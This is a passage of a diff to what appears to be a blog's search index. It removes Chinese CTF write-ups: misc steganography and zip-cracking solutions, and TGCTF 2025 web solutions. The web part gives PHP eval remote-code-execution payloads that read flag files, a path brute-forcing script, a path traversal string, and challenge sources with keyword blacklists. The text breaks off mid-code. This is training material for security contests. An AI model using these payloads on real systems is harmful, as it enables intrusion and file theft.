-<p><code>flag&#123;1d240aafe21a86afc11f38a45b541a49&#125;</code></p>
-<h2 id="2被偷走的文件1"><a href="#2被偷走的文件1" class="headerlink" title="2被偷走的文件1"></a>2被偷走的文件1</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207195352502.png" alt="image-20241207195352502"></p>
-<p>用<code>foremost</code>分离，解压需要密码，先确定流量中没有藏密码，再暴力破解</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200247505.png" alt="image-20241207200247505"></p>
-<p><code>flag&#123;6fe99a5d03fb01f833ec3caa80358fa3&#125;</code></p>
-<h2 id="3藏藏藏"><a href="#3藏藏藏" class="headerlink" title="3藏藏藏"></a>3藏藏藏</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200530486.png" alt="image-20241207200530486"></p>
-<p>看到图片结合题目名，感觉图片隐写或者图片里包含文件<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200653951.png" alt="image-20241207200653951"></p>
-<p>顺利分离出一个压缩包，打开是一个docx文件，隐写无疑了</p>
-<p>然而里面是一个二维码（扫兴啊），直接扫就出来了</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207201042011.png" alt="image-20241207201042011"></p>
-<h2 id="4佛系青年"><a href="#4佛系青年" class="headerlink" title="4佛系青年"></a>4佛系青年</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207201306534.png" alt="image-20241207201306534"></p>
-<p>解压文档需要密码，有一张<code>png</code>是可以查看的，先010查一下</p>
-<p>查完没有藏文件，那应该就是隐写了</p>
-<p>结果没有发现隐写，感觉被骗了</p>
-<p>看一眼压缩包，是伪加密（这里本来没看见的，后来仔细看才发现，也算学到一点分别伪加密的方法）</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207204245901.png" alt="image-20241207204245901"></p>
-<p>改一下解压，文本里可以看到与佛论禅的加密，用一下随波逐流<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207204051135.png" alt="image-20241207204051135"></p>
-<h2 id="5刷新过的图片"><a href="#5刷新过的图片" class="headerlink" title="5刷新过的图片"></a>5刷新过的图片</h2><p>附件是一张图片，提醒刷新，本来以为是什么操作，仔细想了以后是F5（刷新）隐写</p>
-<p>把项目git clone之后发现jdk17环境下运行直接报错，换jdk11看看<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208164651743.png" alt="image-20241208164651743"></p>
-<p>成功了，打开提取的文件发现有PK头</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208164742896.png" alt="image-20241208164742896"></p>
-<p>一开始尝试用复制粘贴的办法在010里重新新建一个文件，但是失败（报错需要分卷，猜测是复制粘贴的过程中有些字符无法被复制）<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165127780.png" alt="image-20241208165127780"></p>
-<p>那么直接改原文件后缀，压缩包是伪加密，手改或者随波逐流走一下结束</p>
-<p><code>flag&#123;96efd0a2037d06f34199e921079778ee&#125;</code></p>
-<h2 id="6秘密文件"><a href="#6秘密文件" class="headerlink" title="6秘密文件"></a>6秘密文件</h2><p>附件是流量，wireshark启动！</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165407266.png" alt="image-20241208165407266"></p>
-<p>foremost出一下，要密码，先尝试弱密码爆破</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165707184.png" alt="image-20241208165707184"></p>
-<p><code>flag&#123;d72e5a671aa50fa5f400e5d10eedeaa5&#125;</code></p>
-<h2 id="7你猜我是个啥"><a href="#7你猜我是个啥" class="headerlink" title="7你猜我是个啥"></a>7你猜我是个啥</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165810484.png" alt="image-20241208165810484"></p>
-<p>看来是改了后缀，010先查查看</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165945001.png" alt="image-20241208165945001"></p>
-<p>演都不演了…</p>
-<h2 id="8鸡你太美"><a href="#8鸡你太美" class="headerlink" title="8鸡你太美"></a>8鸡你太美</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208170109877.png" alt="image-20241208170109877"></p>
-<p>盯完帧没有东西，看看副本，发现已经损坏</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208172403139.png" alt="image-20241208172403139">用010一查是缺少文件头手动补上</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208171838407.png" alt="image-20241208171838407"></p>
-<p>（这里-其实是_）</p>
-<h2 id="9神奇的二维码"><a href="#9神奇的二维码" class="headerlink" title="9神奇的二维码"></a>9神奇的二维码</h2><p>附件是一张二维码，先扫扫看</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208194745048.png" alt="image-20241208194745048"></p>
-<p>看来不在这里，用010查一下<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208194925593.png" alt="image-20241208194925593"></p>
-<p>里面藏了文件，用 <code>binwalk</code>分离（foremost会分不出来）</p>
-<p>分出来四个包，分别解压<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208195041436.png" alt="image-20241208195041436"></p>
-<p>其中一个包解压是一张jpg和一个压缩包（内含一个同名jpg），有两种想法，一种是压缩可读图片为压缩包明文攻击（<code>crc</code>校验值相同），另一种就是暴力拆包</p>
-<p>先暴力拆包，结果显示不给拆<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208205419372.png" alt="image-20241208205419372"></p>
-<blockquote>
-<p>[!NOTE]</p>
-<p>以下为对题目考察的不是明文攻击的验证，可以跳过</p>
-</blockquote>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208200829953.png" alt="image-20241208200829953"></p>
-<p>初步看一下大小是一样的，那么直接查<code>crc</code>值</p>
-<p>这里我们用ubuntu查，使用<code>crc32</code>命令</p>
-<pre><code class="highlight bash"><span class="built_in">sudo</span> apt install libarchive-zip-perl
-crc32 flag.jpg</code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208202527536.png" alt="image-20241208202527536"></p>
-<p>结合压缩包的crc<code>24A345DA</code>，得出不是明文攻击</p>
-<p>还是看看其他几个解压出来的东西吧<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203221291.png" alt="image-20241208203221291"></p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203324389.png" alt="image-20241208203324389"></p>
-<p>到目前为止没有什么用处，看看另一个加密的音频文件和docx文件<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203515033.png" alt="image-20241208203515033"></p>
-<p>这么长的base64还是要忍不住想是不是base64和图像之间的转换的，但是区区8k字符加上还有一个没有解压的包直接让我打消这个念头了，直接<code>basecrack</code>伺候</p>
-<pre><code class="highlight bash">python3 basecrack.py -m -f flag.txt</code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204133481.png" alt="image-20241208204133481">解压之后，用Audacity看一下，一眼摩斯</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204450830.png" alt="image-20241208204450830"></p>
-<p>水平有限，还是手敲罢</p>
-<pre><code class="highlight plaintext">11 111 010 000 0 00 000 0001 0 010 1011 0001 0 010 1011 0 01 000 1011</code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204944858.png" alt="image-20241208204944858">大写不对，换个小写</p>
-<p>鉴定为图片纯纯的诈骗（恼</p>
-<h2 id="10梅花香自苦寒来"><a href="#10梅花香自苦寒来" class="headerlink" title="10梅花香自苦寒来"></a>10梅花香自苦寒来</h2><p>附件是一张<code>png</code>，没有其他明显的提示，看一眼属性</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209152723027.png" alt="image-20241209152723027"></p>
-<p>要画图，那么应该藏了坐标，010查一下</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209152821648.png" alt="image-20241209152821648"></p>
-<p>可以看到文件尾藏了一种数据，接下来有两种方法</p>
-<blockquote>
-<p>随波逐流</p>
-</blockquote>
-<p>将文件拖入会自动提取并且解码，再用其内置的坐标画图最终得到一张反色的二维码</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209153156877.png" alt="image-20241209153156877"></p>
-<p>这个时候用<code>stegsolve</code>反色再扫就出来了</p>
-<blockquote>
-<p>脚本画图</p>
-</blockquote>
-<p>选首尾位置复制到记事本，复制到厨子再hex解码，得到一串坐标<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209154148273.png" alt="image-20241209154148273"></p>
-<p>贴到txt里，接下来就是画图，参考了别的师傅的wp,有两种做法</p>
-<p>​	<code>*gnuplot*</code>绘图</p>
-<p>贴个脚本先</p>
-<pre><code class="highlight plaintext">with open(&#x27;flag.txt&#x27;, &#x27;r&#x27;) as res:  # 坐标格式文件比如(7,7)
-    re = res.read()
-    res.close()
-    
-with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as gnup:   # 将转换后的坐标写入gnuplotTxt.txt
-    re = re.split()
-    tem = &#x27;&#x27;
-    for i in range(0, len(re)):
-        tem = re[i]
-        tem = tem.lstrip(&#x27;(&#x27;)
-        tem = tem.rstrip(&#x27;)&#x27;)
-        for j in range(0, len(tem)):
-            if tem[j] == &#x27;,&#x27;:
-                tem = tem[:j] + &#x27; &#x27; + tem[j+1:]
-        gnup.write(tem + &#x27;\n&#x27;)
-    gnup.close()</code></pre>
-
-<p>得到去括号，去逗号的坐标值</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209155236795.png" alt="image-20241209155236795"></p>
-<p>贴一下ubuntu下的下载和使用方法</p>
-<pre><code class="highlight bash"><span class="built_in">sudo</span> apt-get install gnuplot-x11
-gnuplot
-plot <span class="string">&quot;output.txt&quot;</span></code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209155627592.png" alt="image-20241209155627592"></p>
-<p>可以扫出来</p>
-<p>​	<em>matplotlib</em>绘图</p>
-<p>把原文本去括号，用脚本跑</p>
-<pre><code class="highlight plaintext">import matplotlib.pyplot as plt
-import numpy as np
-with open(&#x27;flag.txt&#x27;, &#x27;r&#x27;) as res:
-    re = res.read()
-    res.close()
-
-with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as gnup:  # 将转换后的坐标写入gnuplotTxt.txt
-    re = re.split()
-    tem = &#x27;&#x27;
-    for i in range(0, len(re)):
-        tem = re[i]
-        tem = tem.lstrip(&#x27;(&#x27;)
-        tem = tem.rstrip(&#x27;)&#x27;)
-        gnup.write(tem + &#x27;\n&#x27;)
-    gnup.close()
-x, y = np.loadtxt(&#x27;output.txt&#x27;, delimiter=&#x27;,&#x27;, unpack=True)
-plt.plot(x, y, &#x27;.&#x27;)
-plt.show()</code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209162242387.png" alt="image-20241209162242387"></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>misc</tag>
       </tags>
   </entry>
   <entry>
@@ -3133,320 +3133,6 @@ O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;
       </tags>
   </entry>
   <entry>
-    <title>TGCTF_Writeup</title>
-    <url>/2025/04/18/TGCTF-Writeup/</url>
-    <content><![CDATA[<h1 id="TGCTF2025"><a href="#TGCTF2025" class="headerlink" title="TGCTF2025"></a>TGCTF2025</h1><p>这比赛说他好吧，确实让我发现自己的知识点漏洞有多大(哈哈，还是过过的知识点，恨不得给自己一巴掌，差点就可以卷铺盖走人了)。说差，你吗的前端游戏我一直以为题目就是那个错误页面，第二天又开才发现是正常的前端游戏，构式靶机。。。还有一堆莫名其妙的脑洞和对电波环节，有点。。了吧</p>
-<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="AAA偷渡阴平"><a href="#AAA偷渡阴平" class="headerlink" title="AAA偷渡阴平"></a><strong>AAA偷渡阴平</strong></h3><pre><code class="highlight php"> <span class="meta">&lt;?php</span>
-
-
-<span class="variable">$tgctf2025</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;tgctf2025&#x27;</span>];
-
-<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$tgctf2025</span>))&#123;
-    <span class="comment">//hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi</span>
-    <span class="keyword">eval</span>(<span class="variable">$tgctf2025</span>);
-&#125;
-<span class="keyword">else</span>&#123;
-    <span class="keyword">die</span>(<span class="string">&#x27;(╯‵□′)╯炸弹！•••*～●&#x27;</span>);
-&#125;
-
-<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</code></pre>
-
-<p>一眼无参RCE。。网上随便找个poc过了</p>
-<pre><code class="highlight php">?tgctf2025=<span class="keyword">eval</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">get_defined_vars</span>())));&amp;jiang=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /f*&#x27;</span>);</code></pre>
-
-<h3 id="火眼辩魑魅"><a href="#火眼辩魑魅" class="headerlink" title="火眼辩魑魅"></a><strong>火眼辩魑魅</strong></h3><p>robots.txt </p>
-<pre><code class="highlight plaintext">User-Agent: *
-Disallow: tgupload.php
-Disallow: tgshell.php
-Disallow: tgxff.php
-Disallow: tgser.php
-Disallow: tgphp.php
-Disallow: tginclude.phphttp://node1.tgctf.woooo.tech:32484/</code></pre>
-
-<p>我是唇笔所以净喜欢走弯路哈哈。。</p>
-<p>明明题面已经说要看哪个了</p>
-<p>稍微尝试了一下发现system,passthru这些基本都被ban了</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250412143217444.png" alt="image-20250412143217444"></p>
-<pre><code class="highlight plaintext">shell=echo `cat /tg*`;</code></pre>
-
-<p>但是赛后看官方WP看红温了哈哈，官方给的是tgxff.php然后用ssti打，说是其他能打出来就是非预期哦，鉴定为史</p>
-<p>同时上面这个shell其实直接连都可以。。。算是绕弯了</p>
-<h3 id="AAA偷渡阴平-复仇"><a href="#AAA偷渡阴平-复仇" class="headerlink" title="AAA偷渡阴平(复仇)"></a><strong>AAA偷渡阴平(复仇)</strong></h3><p>ban了无参RCE，但是一样打</p>
-<pre><code class="highlight php"><span class="meta">&lt;?php</span>
-<span class="variable">$tgctf2025</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;tgctf2025&#x27;</span>];
-<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\|localeconv|pos|current|print|var|dump|getallheaders|get|defined|str|split|spl|autoload|extensions|eval|phpversion|floor|sqrt|tan|cosh|sinh|ceil|chr|dir|getcwd|getallheaders|end|next|prev|reset|each|pos|current|array|reverse|pop|rand|flip|flip|rand|content|echo|readfile|highlight|show|source|file|assert/i&quot;</span>, <span class="variable">$tgctf2025</span>))&#123;
-    <span class="comment">//hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi</span>
-    <span class="keyword">eval</span>(<span class="variable">$tgctf2025</span>);
-&#125;
-<span class="keyword">else</span>&#123;
-    <span class="keyword">die</span>(<span class="string">&#x27;(╯‵□′)╯炸弹！•••*～●&#x27;</span>);
-&#125;
-
-<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
-</code></pre>
-
-<p>poc:</p>
-<pre><code class="highlight php">?tgctf2025=<span class="title function_ invoke__">session_start</span>();<span class="title function_ invoke__">passthru</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">session_id</span>()));
-PHPSESSID=<span class="number">636174202</span>f666c6167</code></pre>
-
-<h3 id="直面天命"><a href="#直面天命" class="headerlink" title="直面天命"></a><strong>直面天命</strong></h3><p>先看一眼源码</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250413221047192.png" alt="image-20250413221047192"></p>
-<p>换hint</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250413221120246.png" alt="image-20250413221120246"></p>
-<p>。。懒得喷，我直接pt买hint了哈哈</p>
-<p>这里贴一下队里师傅的脚本</p>
-<pre><code class="highlight py"><span class="keyword">import</span> requests
-<span class="keyword">import</span> itertools
-<span class="keyword">import</span> string
-<span class="keyword">import</span> time
-<span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor
-
-<span class="comment"># 目标网站的基础URL - 使用前请替换为实际目标URL</span>
-BASE_URL = <span class="string">&quot;http://node2.tgctf.woooo.tech:32010/&quot;</span>  <span class="comment"># 请替换为实际目标URL</span>
-
-<span class="comment"># 使用所有26个小写字母</span>
-all_letters = string.ascii_lowercase  <span class="comment"># &#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>
-
-<span class="comment"># 定义测试单个路径的函数</span>
-
-
-<span class="keyword">def</span> <span class="title function_">test_path</span>(<span class="params">path</span>):
-    url = BASE_URL + path
-    <span class="keyword">try</span>:
-        response = requests.get(url, timeout=<span class="number">3</span>)
-
-        <span class="comment"># 根据状态码和响应长度来判断是否找到有效页面</span>
-        status = response.status_code
-        length = <span class="built_in">len</span>(response.text)
-
-        <span class="comment"># 记录所有非404响应</span>
-        <span class="keyword">if</span> status != <span class="number">404</span>:
-            <span class="built_in">print</span>(<span class="string">f&quot;[+] 发现: <span class="subst">&#123;url&#125;</span> (状态码: <span class="subst">&#123;status&#125;</span>, 长度: <span class="subst">&#123;length&#125;</span>)&quot;</span>)
-
-            <span class="comment"># 保存发现的路径到文件中</span>
-            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;found_paths.txt&quot;</span>, <span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> f:
-                f.write(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span> (状态码: <span class="subst">&#123;status&#125;</span>, 长度: <span class="subst">&#123;length&#125;</span>)\n&quot;</span>)
-
-            <span class="comment"># 如果是200状态码，保存响应内容以便检查</span>
-            <span class="keyword">if</span> status == <span class="number">200</span>:
-                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;response_<span class="subst">&#123;path&#125;</span>.html&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:
-                    f.write(response.text)
-
-    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:
-        <span class="keyword">pass</span>  <span class="comment"># 忽略连接错误，继续测试</span>
-
-    <span class="keyword">return</span> path
-
-
-<span class="comment"># 显示开始信息</span>
-<span class="built_in">print</span>(<span class="string">&quot;[*] 开始爆破所有4字母路径...&quot;</span>)
-<span class="built_in">print</span>(<span class="string">f&quot;[*] 目标URL: <span class="subst">&#123;BASE_URL&#125;</span>&quot;</span>)
-<span class="built_in">print</span>(<span class="string">f&quot;[*] 总组合数: <span class="subst">&#123;<span class="number">26</span>**<span class="number">4</span>&#125;</span> (这可能需要一些时间)&quot;</span>)
-
-<span class="comment"># 跟踪进度变量</span>
-total_combinations = <span class="number">26</span>**<span class="number">4</span>  <span class="comment"># 可能的4字母组合总数</span>
-completed = <span class="number">0</span>
-start_time = time.time()
-
-<span class="comment"># 使用多线程加速过程</span>
-<span class="keyword">with</span> ThreadPoolExecutor(max_workers=<span class="number">20</span>) <span class="keyword">as</span> executor:
-    <span class="comment"># 生成并测试所有4字母组合</span>
-    <span class="keyword">for</span> combo <span class="keyword">in</span> itertools.product(all_letters, repeat=<span class="number">4</span>):
-        path = <span class="string">&#x27;&#x27;</span>.join(combo)
-        executor.submit(test_path, path)
-
-        <span class="comment"># 定期更新进度</span>
-        completed += <span class="number">1</span>
-        <span class="keyword">if</span> completed % <span class="number">5000</span> == <span class="number">0</span>:
-            elapsed = time.time() - start_time
-            percentage = (completed / total_combinations) * <span class="number">100</span>
-            rate = completed / elapsed <span class="keyword">if</span> elapsed &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span>
-            remaining = (total_combinations - completed) / \
-                rate <span class="keyword">if</span> rate &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span>
-
-            <span class="built_in">print</span>(<span class="string">f&quot;[*] 进度: <span class="subst">&#123;completed&#125;</span>/<span class="subst">&#123;total_combinations&#125;</span> (<span class="subst">&#123;percentage:<span class="number">.2</span>f&#125;</span>%) - &quot;</span>
-                  <span class="string">f&quot;已用时间: <span class="subst">&#123;elapsed:<span class="number">.1</span>f&#125;</span>秒 - 预计剩余: <span class="subst">&#123;remaining:<span class="number">.1</span>f&#125;</span>秒 - 速度: <span class="subst">&#123;rate:<span class="number">.1</span>f&#125;</span>请求/秒&quot;</span>)
-
-<span class="built_in">print</span>(<span class="string">&quot;[*] 爆破完成! 查看 &#x27;found_paths.txt&#x27; 获取结果。&quot;</span>)</code></pre>
-
-<p><code>/aazz</code></p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250413221221814.png" alt="image-20250413221221814"></p>
-<p>…参…数……?那我问你，参数名是什么，那我问你(也有可能是我没进群所以没看到类似通知的缘故)</p>
-<p>反正后面知道是filename(赛后知道这个也是要fuzz出来的),看名字应该就是任意文件读取了</p>
-<p>稍微试一下啊</p>
-<p>预期应该是抓源码的，结果哈哈</p>
-<pre><code class="highlight plaintext">aazz?filename=../../flag</code></pre>
-
-<p>贴一个源码吧</p>
-<pre><code class="highlight python"><span class="keyword">import</span> os
-<span class="keyword">import</span> string
-<span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string, jsonify, send_from_directory
-<span class="keyword">from</span> a.b.c.d.secret <span class="keyword">import</span> secret_key
-
-app = Flask(__name__)
-
-black_list=[<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;import&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;read&#x27;</span>,<span class="string">&#x27;base&#x27;</span>,<span class="string">&#x27;globals&#x27;</span>]
-<span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">name</span>):
-    <span class="keyword">for</span> x <span class="keyword">in</span> black_list:
-        <span class="keyword">if</span> x <span class="keyword">in</span> name.lower():
-            <span class="keyword">return</span> <span class="literal">True</span>
-    <span class="keyword">return</span> <span class="literal">False</span>
-<span class="keyword">def</span> <span class="title function_">is_typable</span>(<span class="params">char</span>):
-    <span class="comment"># 定义可通过标准 QWERTY 键盘输入的字符集</span>
-    typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace
-    <span class="keyword">return</span> char <span class="keyword">in</span> typable_chars
-
-<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span>
-<span class="keyword">def</span> <span class="title function_">home</span>():
-    <span class="keyword">return</span> send_from_directory(<span class="string">&#x27;static&#x27;</span>, <span class="string">&#x27;index.html&#x27;</span>)
-
-<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/jingu&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span>
-<span class="keyword">def</span> <span class="title function_">greet</span>():
-    template1=<span class="string">&quot;&quot;</span>
-    template2=<span class="string">&quot;&quot;</span>
-    name = request.form.get(<span class="string">&#x27;name&#x27;</span>)
-    template = <span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>&#x27;</span>
-    <span class="keyword">if</span> waf(name):
-        template = <span class="string">&#x27;想干坏事了是吧hacker？哼，还天命人，可笑，可悲，可叹</span></code></pre>
-
-
-
-<h3 id="直面天命（复仇）"><a href="#直面天命（复仇）" class="headerlink" title="直面天命（复仇）"></a><strong>直面天命（复仇）</strong></h3><pre><code class="highlight python"><span class="keyword">import</span> os
-<span class="keyword">import</span> string
-<span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string, jsonify, send_from_directory
-<span class="keyword">from</span> a.b.c.d.secret <span class="keyword">import</span> secret_key
-
-app = Flask(__name__)
-
-black_list=[<span class="string">&#x27;lipsum&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;map&#x27;</span>,<span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;value&#x27;</span>, <span class="string">&#x27;get&#x27;</span>, <span class="string">&quot;url&quot;</span>, <span class="string">&#x27;pop&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;import&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;read&#x27;</span>,<span class="string">&#x27;base&#x27;</span>,<span class="string">&#x27;globals&#x27;</span>,<span class="string">&#x27;_.&#x27;</span>,<span class="string">&#x27;set&#x27;</span>,<span class="string">&#x27;application&#x27;</span>,<span class="string">&#x27;getitem&#x27;</span>,<span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;init&#x27;</span>, <span class="string">&#x27;arg&#x27;</span>, <span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;app&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]
-<span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">name</span>):
-    <span class="keyword">for</span> x <span class="keyword">in</span> black_list:
-        <span class="keyword">if</span> x <span class="keyword">in</span> name.lower():
-            <span class="keyword">return</span> <span class="literal">True</span>
-    <span class="keyword">return</span> <span class="literal">False</span>
-<span class="keyword">def</span> <span class="title function_">is_typable</span>(<span class="params">char</span>):
-    <span class="comment"># 定义可通过标准 QWERTY 键盘输入的字符集</span>
-    typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace
-    <span class="keyword">return</span> char <span class="keyword">in</span> typable_chars
-
-<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span>
-<span class="keyword">def</span> <span class="title function_">home</span>():
-    <span class="keyword">return</span> send_from_directory(<span class="string">&#x27;static&#x27;</span>, <span class="string">&#x27;index.html&#x27;</span>)
-
-<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/jingu&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span>
-<span class="keyword">def</span> <span class="title function_">greet</span>():
-    template1=<span class="string">&quot;&quot;</span>
-    template2=<span class="string">&quot;&quot;</span>
-    name = request.form.get(<span class="string">&#x27;name&#x27;</span>)
-    template = <span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>&#x27;</span>
-    <span class="keyword">if</span> waf(name):
-        template = <span class="string">&#x27;想干坏事了是吧hacker？哼，还天命人，可笑，可悲，可叹</span>
-<span class="string">Image&#x27;</span>
-    <span class="keyword">else</span>:
-        k=<span class="number">0</span>
-        <span class="keyword">for</span> i <span class="keyword">in</span> name:
-            <span class="keyword">if</span> is_typable(i):
-                <span class="keyword">continue</span>
-            k=<span class="number">1</span>
-            <span class="keyword">break</span>
-        <span class="keyword">if</span> k==<span class="number">1</span>:
-            <span class="keyword">if</span> <span class="keyword">not</span> (secret_key[:<span class="number">2</span>] <span class="keyword">in</span> name <span class="keyword">and</span> secret_key[<span class="number">2</span>:]):
-                template = <span class="string">&#x27;连“六根”都凑不齐，谈什么天命不天命的，还是戴上这金箍吧</span>
-<span class="string"></span>
-<span class="string">再去西行历练历练</span>
-<span class="string"></span>
-<span class="string">Image&#x27;</span>
-                <span class="keyword">return</span> render_template_string(template)
-            template1 = <span class="string">&quot;“六根”也凑齐了，你已经可以直面天命了！我帮你把“secret_key”替换为了“&#123;&#123;&#125;&#125;”</span>
-<span class="string">最后，如果你用了cat，就可以见到齐天大圣了</span>
-<span class="string">&quot;</span>
-            template= template.replace(<span class="string">&quot;天命&quot;</span>,<span class="string">&quot;&#123;&#123;&quot;</span>).replace(<span class="string">&quot;难违&quot;</span>,<span class="string">&quot;&#125;&#125;&quot;</span>)
-            template = template
-    <span class="keyword">if</span> <span class="string">&quot;cat&quot;</span> <span class="keyword">in</span> template:
-        template2 = <span class="string">&#x27;</span>
